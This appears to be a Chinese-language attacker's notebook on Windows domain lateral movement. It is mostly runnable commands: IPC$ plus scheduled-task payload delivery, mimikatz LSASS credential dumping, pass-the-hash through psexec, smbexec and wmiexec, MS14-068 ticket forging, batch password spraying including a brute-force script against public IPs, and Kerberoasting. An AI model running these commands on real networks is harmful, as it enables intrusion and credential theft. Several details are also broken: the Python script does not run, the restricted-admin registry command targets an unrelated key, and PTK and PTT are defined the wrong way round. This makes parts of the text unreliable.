![](https://s4.ax1x.com/2021/12/11/oTDIU0.png)

#### IPC$+计划任务/系统服务

IPC是进程通信管道，通过提供用户名密码建立了一条安全的、加密的、用于数据交换的通道。当然，还是在同一个时间，还是同样的两个IP，他们之间只能建立一个IPC$连接，通过这个连接，可以实现在被连接的目标机器上搞文件上传、下载、命令执行

###### 步骤

（0）拿到某台主机信息收集，用minikatz拿到账号和密码信息

（1）首先建立向目标主机的IPC$连接（at和schtask）（win2012前用at，之后用schtask）

（2）其次把命令执行的脚本传到目标主机

（3）再次创建计划任务在目标机器上马，直接CS上线

（4）最后过河拆桥删除IPC$连接

###### 条件

（1）目标机器没有禁用IPC\$连接，没有什么防火防盗拦截IPC$，139 445 端口也开了（能走445走445，不能则走139）

（2）目标机器小管理员开了IPC$默认共享服务

（3）获取了目标机器的小管理员的管理员权限的账号密码（最好是域管理员账号密码），明文的

（4）目标系统能支持IPC$，且和攻击机能彼此互通

~~~
net use \\server\ipc$"password" /user:username # 工作组
net use \\server\ipc$"password" /user:domain\username #域内
dir \\xx.xx.xx.xx\C$\ # 查看文件列表
copy \\xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件
copy 1.bat \\xx.xx.xx.xx\C$ # 复制文件
net use \\xx.xx.xx.xx\C$\1.bat /del # 删除 IPC
net view xx.xx.xx.xx # 查看对方共享
~~~

~~~
[at] & [schtasks]
#at < Windows2012
net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\ad
ministrator # 建立 ipc 连接：
copy add.bat \\192.168.3.21\c$ #拷贝执行文件到目标机器
at \\192.168.3.21 15:47 c:\add.bat #添加计划任务
#schtasks >=Windows2012
net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
ministrator # 建立 ipc 连接：
copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘
schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建 adduser 任务
对应执行文件
schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务
schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务
~~~



###### 建立 IPC 常见的错误代码

（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限

（2）51：网络问题，Windows 无法找到网络路径

（3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有

防火墙等问题

（4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$

（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除

（6）1326：账号密码错误

（7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况

（8）2242：用户密码过期，目标有账号策略，强制定期更改密码

###### 建立 IPC 失败的原因

（1）目标系统不是 NT 或以上的操作系统

（2）对方没有打开 IPC$共享

（3）对方未开启 139、445 端口，或者被防火墙屏蔽

（4）输出命令、账号密码有错误

~~~powershell
[at] & [schtasks]
#at < Windows2012
net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\ad
ministrator # 建立 ipc 连接：
copy add.bat \\192.168.3.21\c$ #拷贝执行文件到目标机器
at \\192.168.3.21 15:47 c:\add.bat #添加计划任务
#schtasks >=Windows2012
net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
ministrator # 建立 ipc 连接：
copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘
schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建 adduser 任务
对应执行文件
schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务
schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务
~~~

如果minkatz没抓到密码明文，抓到的是hash，win2012以上版本默认关闭wdigest，攻击者无法从内存中（lsass.exe）获取明文密码，如果win2012以下打过KB2871997补丁也无法得到明文密码

在内网中，无论是本地的内存转储还是域的`NTDS.dit`中都存在着一定的`LM-Hash`和`NTLM-Hash`，而在操作系统Windows 2012 server之后（包含）内存转储中是不保存明文密码的

早期Windows使用的`LM-Hash`、`NTLM-Hash`、Linux中`/etc/shadow/`的`SHA-256`/`SHA-512`亦或者Wordpress用户的加盐密码（`MD5`）

那么需要impacket包hash传递，可能需要做免杀

~~~powershell
atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"
atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"
atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
~~~

之后就可以批量 HASH 传递

~~~powershell
FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ "admin!@#45" /user:administrator #批量检测 IP 对应明文
连接
FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测 IP 对应明文
回显版
FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应 IP
回显版
FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测
HASH 对应 IP 回显版
~~~

支持用户名，ip，密码（明文/hash）三个变量变化python脚本打包成exe：

~~~python
import os,time

ips={
	'124.70.20.10',
	'114.114.114.114'
}

users={
	'boss',
	'dbadmin'
}

passs={
	'admin',
	'admin123'
}

for i in ips:
	for user in users:
		for mima in passs:
			exec="net use \\"+ "\\"+ip+'\ipc$'+mima+' /user:god\\'+user
			print('--->'+exec+'<---')
			os.system(exec)
			time.sleep(1)
~~~





！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！

windows系统有四种安全认证，LM hash，NTLM hash，NTLM2 hash，Kerberos。

第一种LM hash用在早期的xp或者98这种，需要得到LM hash

NT之后默认是NTLM hash

现在都是Kerberos了

#### 域横向 smb&wmi 明文或 hash 传递

https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

###### Procdump+Mimikatz 配合获取

procdump -accepteula -ma lsass.exe lsass.dmp

~~~
sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:c64c941475ad32523154462d324e40fa "/run:mstsc.exe /restrictedadmin"
~~~

（2）mimikatz 上执行：

sekurlsa::minidump lsass.dmp

sekurlsa::logonPasswords full

\#Pwdump7

\#QuarksPwdump

###### hashcat破解hash密码

https://www.freebuf.com/sectool/164507.html

hashcat -a 0 -m 1000 hash file --force		这里-a 0是代表字典攻击，1000是表示NTLM hash

###### 域横向移动 SMB 服务利用-psexec,smbexec(官方自带)

https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。#psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递

net use \\192.168.3.32\ipc$ "admin!@#45" /user:ad

ministrator

psexec \\192.168.3.32 -s cmd # 需要先有 ipc 链接 -s 以 System 权限运行

\#psexec 第二种：不用建立 IPC 直接提供明文账户密码

psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd

psexec -hashes :\$HASH$ ./administrator@10.1.2.3

psexec -hashes :\$HASH$ domain/administrator@10.1.2.3

psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 官方 Pstools 无法

采用 hash 连接

###### impacket-smbexec

https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools

\#smbexec 无需先 ipc 链接 明文或 hash 传递

smbexec god/administrator:Admin12345@192.168.3.21

smbexec ./administrator:admin!@#45@192.168.3.32

smbexec -hashes :\$HASH$ ./admin@192.168.3.21

smbbexec -hashes :\$HASH$ domain/admin@192.168.3.21

smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32

smbexec -hashes :ccef208c6485269c20db2cad21734fe7god/administrator@192.168.3.21

###### 域横向移动 WMI 服务利用-cscript,wmiexec,wmic

WMI(Windows Management Instrumentation) 是通过135端口进行利用，支持用户名明文或者 hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。

**\#自带 WMIC 明文传递 无回显**

wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create "cmd.exe /c 

ipconfig >C:\1.txt"

**\#自带 cscript 明文传递 有回显**

cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345

**\#套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本**

wmiexec ./administrator:admin!@#45@192.168.3.32 "whoami"

wmiexec god/administrator:Admin12345@192.168.3.21 "whoami"

wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"

wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 "whoami"

[![oTfx6P.jpg](https://s4.ax1x.com/2021/12/11/oTfx6P.jpg)](https://imgtu.com/i/oTfx6P)

#### PTH&PTK&PTT 哈希票据传递

PTH就是pass the hash，哈希传递，利用NT hash，NTLM hash

PTK就是pass the ticket，票据传递，黄金票据和白银票据，增强型金票，委派

PTT就是pass the key，利用ekeys aes256进行渗透测试

------------------------------------------------------------------------------------------------------------------------------------------

PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash

访问远程主机或服务，而不用提供明文密码。

如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可

以攻击成功。对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012 等，可以使用 AES keys

代替 NT hash 来实现 ptk 攻击

------

这里pth中，如上：

这里ptk中，有如下几种攻击方式：

MS14-068就是提升到域控权限；黄金票据就是拿下域控后可以对域内主机服务访问，优点是域内全部控制，缺点是必须要拿下域控；白银票据是针对某台主机的指定服务，优点是不用和kdc通信，缺点是只能访问特定的几个服务；此外还有增强型金票；委派

总结：**KB2871997 补丁后的影响pth：没打补丁用户都可以连接，打了补丁只能 administrator 连接**

ptk：打了补丁才能用户都可以连接，采用 aes256 连接

[![oTTRYD.png](https://s4.ax1x.com/2021/12/11/oTTRYD.png)](https://imgtu.com/i/oTTRYD)

PTH ntlm 传递，未打补丁下的工作组及域连接：

~~~
sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7
sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c
sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7

dir \\192.168.3.21\c$
~~~

PTK aes256 传递

打补丁后的工作组及域连接：

~~~
sekurlsa::ekeys #获取 aes
sekurlsa::pth /user:mary /domain:god
/aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b
~~~



###### 域横向移动 PTT 传递-ms14068&kekeo&本地

**第一种利用漏洞：**

能实现普通用户直接获取域控 system 权限

**\#MS14-068 powershell 执行**

1.查看当前 sid whoami/user

2.mimikatz # kerberos::purge

//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造

mimikatz # kerberos::list 

//查看当前机器凭证

mimikatz # kerberos::ptc 票据文件 //将票据注入到内存中

3.利用 ms14-068 生成 TGT 数据

ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码

MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 - 

p admin!@#45

4.票据注入内存

mimikatz.exe "kerberos::ptc TGT_mary@god.org.ccache" exit

5.查看凭证列表 klist

6.利用

dir \\192.168.3.21\c$

**第二种利用工具 kekeo**

https://hub.fastgit.org/gentilkiwi/kekeo/releases

1.生成票据

kekeo "tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c"

2.导入票据

kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi

3.查看凭证 klist

4.利用 net use 载入

dir \\192.168.3.21\c$

**第三种利用本地票据(需管理权限)**

sekurlsa::tickets /export

kerberos::ptt xxxxxxxxxx.xxxx.kirbi

总结：ptt 传递不需本地管理员权限，连接时主机名连接，基于漏洞,工具,本地票据

**第四种国产 Ladon 内网杀器测试验收**

https://k8gege.org/Ladon/

https://hub.fastgit.org/k8gege/Ladon/releases

![](https://s4.ax1x.com/2022/01/17/7UnMlR.png)

#### RDP

##### 明文连接。。。

##### hash连接

windows server需要开启restricted admin mode，在windows 8.1和windows server 2012 R2中默认开启，同时如果win7和windows server 2008 R2安装了2871997，2973351补丁也支持；开启命令；

Reg add HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d 00000000 /f

~~~
mstsc.exe /restrictedadmin
mimikatz.exe
privilege::debug
sekur1sa::pth /user:administrator /domain:god/ntlm:ccef208c64xxxxx "/run:mstsc.exe/restrictedadmin"
~~~



#### SPN扫描

~~~
探针
setspn -q */*
setspn -q */* | findstr "MYSQL"
~~~



![](https://s4.ax1x.com/2022/01/17/7UnlOx.png)

~~~
请求
mimikatz.exe "kerberos::ask /target:xxxx"
导出
mimikatz.exe "kerberos::list /export"
破解
python tgsrepcrack.py passwd.txt xxxx.kirbi
~~~

![](https://s4.ax1x.com/2022/01/17/7Un3m6.png)

~~~
重写
python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500
python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512

mimikatz.exe kerberos::ptt xxxx.kirbi #将生成的票据注入内存
~~~



tgsrepcrack.py脚本在忍者系统有或者在网上搜